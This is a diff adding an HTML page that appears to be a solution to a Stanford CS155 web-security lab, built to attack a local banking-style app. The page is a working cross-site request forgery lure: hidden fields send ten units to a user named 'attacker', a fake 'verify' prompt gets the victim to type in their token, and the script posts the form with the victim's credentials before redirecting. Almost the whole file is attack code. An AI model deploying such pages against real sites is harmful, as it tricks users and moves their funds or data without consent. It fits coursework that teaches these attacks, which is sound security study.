@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            window.addEventListener("load", function() {
+                function redirect() {
+                    window.location = 'http://cs155.stanford.edu/'
+                }
+                function sendData() {
+                    var xhr = new XMLHttpRequest();
+                    var fd = new FormData(form);
+                    xhr.onload = xhr.onerror = redirect();
+                    xhr.withCredentials=true;
+                    xhr.open("post", "http://localhost:3000/super_secure_post_transfer/");
+                    xhr.send(fd);
+                }
+                var form = document.getElementById("myForm");
+                form.addEventListener("submit", function (event) {
+                    event.preventDefault();
+                    sendData();
+                });
+            })
+        </script>
+    </head>
+    <body>
+        <form method="post" id="myForm">
+            <label for="token">Input string below to verify...</label>
+            <input type="text" name="destination_username" value="attacker" style="display: none;">
+            <input type="text" name="quantity" value="10" style="display: none;">
+            <input type="text" name="tokeninput" value="">
+            <input type="submit" value="Verify">
+        </form>
+        <iframe src="bp2.html" scrolling="no" style="border:none;"></iframe>
+    </body>
+</html>
